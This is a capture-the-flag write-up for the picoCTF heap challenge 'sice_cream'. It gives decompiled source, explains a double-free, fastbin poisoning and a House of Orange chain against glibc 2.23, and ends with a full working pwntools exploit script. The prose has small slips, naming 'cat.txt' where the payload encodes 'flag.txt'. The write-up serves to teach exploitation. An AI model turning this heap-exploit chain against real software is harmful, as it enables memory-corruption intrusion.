# sice_cream

We are given a stripped binary called `sice_cream` as well as two libc files: `libc.so.6` and `ld-2.23.so`. Therefore, we know we are working in GLIBC version 2.23. When running (with `LD_PRELOAD=./libc.so.6`; also make sure all three files are marked as executable), we are prompted for a name, then greeted with a four option menu: `Buy sice cream`, `Eat sice cream`, `Reintroduce yourself`, and `Exit`. Before we move on, let's also take a look at the checksec for this problem:
```
[*] '/.../sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
```
Notably, `Full RELRO` means the GOT is not writeable, which rules out quite a few attack vectors. Having `PIE` disabled is nice though, and suggests that we might need to use a fixed address of some function or global variable in our exploit. After a bit of messing around, our next logical step is to reverse the binary. With some Ghidra, `objdump`, and `gdb`, we get:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>

// note: creams is stored in memory right after name
char name[256];
char* creams[20];

// 0x400cc4
void printfile(char *filename){
	char c;
	FILE *file;
	
	file = fopen(filename,"r");
	if (file != NULL) {
		while (1) {
			c = getc(file);
			if (c == 0xff) break;
			putchar(c);
		}
	}
}

int get_num_creams() {
  int ct;
  for (ct = 0; creams[ct] != NULL; ct++) {
    if (ct > 19) {
      return -1;
    }
  }
  return ct;
}

void eat() {
	char buf[24];
	puts("Which sice cream do you want to eat?");
	printf("> ");
	read(0,buf,16);
	uint which = (uint)strtoul(buf,NULL,10);
	if (which > 19) {
		puts("Invalid index!");
		exit(-1);
	}
	// horrible, allows double free
	free(creams[which]);
	puts("Yum!");
}

void buy() {
	char buf[24];
	int num_creams = get_num_creams();
	if (num_creams < 0) {
		puts("Out of space!");
		exit(-1);
	}
	puts("How much sice cream do you want?");
	printf("> ");
	read(0,buf,16);
	uint amt = (uint)strtoul(buf,NULL,10);
	if (amt > 88) {
		puts("That\'s too much sice cream!");
		exit(-1);
	}
	char* newcream = malloc(amt);
	creams[num_creams] = newcream;
	puts("What flavor?");
	printf("> ");
	read(0,creams[num_creams],amt);
	puts("Here you go!");
}

// If name is not null-terminated (i.e. we fill all 256 chars)
// then rename() will leak creams[0]
void reintroduce() {
	puts("What\'s your name again?");
	printf("> ");
	read(0,name,256);
	printf("Ah, right! How could a forget a name like %s!\n",name);
}

void menu() {
	puts("1. Buy sice cream");
	puts("2. Eat sice cream");
	puts("3. Reintroduce yourself");
	puts("4. Exit");
}

void main() {
	int choice;
	char buf[24];
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	puts("Welcome to the Sice Cream Store!");
	puts("We have the best sice cream in the world!");
	puts("Whats your name?");
	printf("> ");
	read(0,name,256);

	while (1) {
		menu();
		printf("> ");
		read(0,buf,16);
		choice = (int)strtoul(buf,NULL,10);
		switch(choice) {
			case 1:
				buy();
				break;
			case 2:
				eat();
				break;
			case 3:
				reintroduce();
				break;
			case 4:
				puts("Too hard? ;)");
			default:
				exit(0);
		}
	}
}
```
Obviously, this is a heap exploitation problem. We also note a few things:
- We are restricted to `buy`ing pointers of fastbin size (in fact, maxing out at `0x58`).
- There is an unreferenced function at `0x400cc4` that prints out the file given by its argument.
- Eating a sice cream `free`s the respective pointer, but does not `NULL` it out in `creams`. This allows us to potentially abuse a double free.
- `name` is directly above `creams` in memory.
- If we `reintroduce` with a name of the full length `256`, we can leak the first pointer in `creams`.

Since most heap problems require a libc leak at some point, we think of ways to do this. Unfortunately, we can only allocate fastbin size chunks, which will not produce libc pointers. If only we could make a smallbin chunk...

The key observation to make from here is that `rename` lets us have total control of `256` bytes (actually `255` because of the forced `\n`) in memory. We actually _can_ make a smallbin chunk: a forged one in `name`. Of course, we wouldn't be able to free that smallbin chunk to actually get the libc pointers written in unless we controlled `creams`.

But we can in fact control `creams`! Remembering that `name` is right above `creams` in memory, we realize that we can use a  double free into fastbin forward pointer poisoning to get `malloc` to return a fake chunk in `name`, right above `creams`! Thus, we will write into `name` the following data:
```
[name]
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x00000000000000c1    0x0000000000000031
0x602110:    0x0000000000000000    0x0000000000000000
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000041
[creams]
0x602140:    ...
```
By abusing double free, we can coerce malloc into returning the chunk at `0x602130`, which in turn means we can write `0x602040` into `creams[0]`, and thus free our fake fastbin chunk by `eat`ing `0`. (The chunk in between is to pass corruption checks.) If we do this, `name` will begin like so:
```
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    <  libc pointer  >    <  libc pointer  >
```
... and reintroducing ourselves with the name `AAAAAAAABBBBBBBB` will allow us to leak libc.

From here, we might get stuck. Ideally, we would finish by using the same exploit and tricking `malloc` into returning a fake (misaligned) chunk of size `7f` right above `__malloc_hook`, then writing what we want into `__malloc_hook`. But such a chunk would be of fastbin size, and we can only allocate chunks of size up to `0x60`, so that wouldn't work.

Eventually, we remember than we are in libc 2.23, which is coincidentally the version right before an exploit called House of Orange was patched. This exploit (in a _very_ brief nutshell; see [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c) for more details, referring to "phase two" of the attack) allows us to call an arbitrary function with a string by `malloc`ing after `free`ing a smallbin chunk for which we can write to after being freed. We might consider the standard `system("/bin/sh")`; however, when this is manually tested, we notice that `system` will silently crash and do nothing. This limitation is because we are using `LD_PRELOAD`: `/bin/sh` will crash when executed with this wrong version of libc. (This issue means that any normal finish involving getting a shell probably won't work). But we recall the secret `print_file` function: we can simply call `print_file("cat.txt")`. Now that we know what to do, we give our exploit script (with useful comments):
```python
from pwn import *
import time

""" Helper methods """
def wait():
	time.sleep(0.05)
def flush():
	return p.recv(4096)

def buy(name, amt):
	p.sendline("1")
	p.recvuntil("How much sice cream do you want?")
	p.sendline(str(amt))
	p.recvuntil("What flavor?")
	p.sendline(name)
	p.recvuntil("4. Exit")
	wait()
def eat(n):
	p.sendline("2")
	p.recvuntil("Which sice cream do you want to eat?")
	p.sendline(str(n))
	p.recvuntil("4. Exit\n")
	wait()
def rename(s):
	p.sendline("3")
	p.recvuntil("What's your name again?")
	p.sendline(s)
	wait()
	return flush()

# Converts a string containing memory into a packed exploit string
def str2payload(s):
	s = s.replace("\n"," ")
	s = s.replace("\t"," ")
	# We ignore chunks ending with ":" for convenience
	mem = [x for x in s.split(" ") if x is not "" and not x[-1] == ":"]
	nums = [int(x,16) for x in mem]
	return ''.join([p64(x) for x in nums])

# Converts a leaked pointer string into an integer address
def leak2addr(s):
    if s == '':
        return -1
    bytelist = [ord(x) for x in s]
    assert len(bytelist) <= 8
    assert len(bytelist) >= 4
    lsw = bytelist[0:4]
    msw = bytelist[4:8]
    while len(msw) < 4:
    	msw.append(0)
    lsw_val = lsw[0] *1 + lsw[1] *256 + lsw[2] *256*256 + lsw[3] *256*256*256
    msw_val = msw[0] *1 + msw[1] *256 + msw[2] *256*256 + msw[3] *256*256*256
    val = lsw_val + 256*256*256*256 * msw_val
    return val

# Secret function that prints out the contents of a file given by its argument.
PRINT_FILE = 0x400cc4

""" Exploit """
# p = process('./sice_cream', env={"LD_PRELOAD": "/home/alex/CTF/sice/libc.so.6"})
p = remote('2019shell1.picoctf.com', 5033)
p.sendline("~~~~")
wait()

# Our first job is to get a libc leak. We will accomplish this by writing a fake
# fastbin chunk into name and freeing it.
m1 = """
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x00000000000000c1    0x0000000000000031
0x602110:    0x0000000000000000    0x0000000000000000
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000041
"""
# THE LAST CHAR IS REMOVED BECAUSE IT WILL BECOME \n
payload1 = str2payload(m1)[:-1]


# Because creams is directly below name in memory, we use double free fastbin
# poisoning to get the chunk at RETME, which we can use to write SMALLBIN to
# creams[0].
RETME = 0x602130
SMALLBIN = 0x602050
SZ = 56

# Standard double free to coerce malloc to return RETME
buy("", SZ)
# We also need to leak a heap address, and we can do that right after our
# first malloc. By filling name with non-NULL bytes we get rename to leak
# creams[0] and thus calculate HEAPBASE.
flush()
rename("A"*255)
data = flush()
# Note: leak2addr will FAIL if our HEAPBASE happens to have a NULL byte in it.
# If so, we can just run again.
HEAPBASE = leak2addr(data.split('\n')[1][:-1]) - 0x10
print "=== LEAKED HEAPBASE: {0} ===".format(hex(HEAPBASE))

# Put the contents of m1 into name, including our smallbin chunk and the chunk
# above as well as a chunk in between to pass the corruption checks.
rename(payload1)

# Continue the double free
buy("", SZ)
buy("", SZ)
eat(0)
eat(1)
eat(0)
# Poison the fastbin fd pointer
buy(p64(RETME),SZ)
buy("",SZ)
# (We will use this chunk (at HEAPBASE + 0x10) later)
buy(p64(PRINT_FILE)*5,SZ)
# This malloc will now give us the chunk at RETME, so we can write the address
# of our smallbin chunk into creams[0].
buy(p64(SMALLBIN),SZ)

# Free the fake smallbin chunk
eat(0)

# Leak libc with rename. We fill the first 16 bytes with non-NULL because the
# libc address begins at byte 17
flush()
rename("AAAABBBBCCCCDDD")
data = flush()

# Calculate critical offsets
LEAKED = leak2addr(data.split('\n')[1][:-1])
LIBC_BASE = LEAKED - 0x3a4438
IOLISTALL = LIBC_BASE + 0x3a4de0
print "=== LEAKED LIBC: {0} ===".format(hex(LIBC_BASE))
print "=== _IO_list_all: [{0}] ===".format(hex(IOLISTALL))

# Set up house of orange exploit. Our vtables address will point to the chunk we
# allocated earlier (at HEAPBASE + 0x10), which we filled with the address of
# print_file.
m2 = """
0x602040:    0x7478742e67616c66    0x0000000000000100
0x602050:    0x0000000000000000    {0}
0x602060:    0x0000000000000000    0x0000000000000061
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x0000000000000000    0x0000000000000061
0x602110:    0x0000000000000000    {1}
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000000
""".format(hex(IOLISTALL-16), hex(HEAPBASE+0x10))
payload2 = str2payload(m2)[:-1]
rename(payload2)

p.interactive()
# Now, we just buy a 0x58 (88), which will trigger our HoO chain and flag us!
# Note: due to alignment issues we will not always get a flag from this.
# If it fails, just run again
```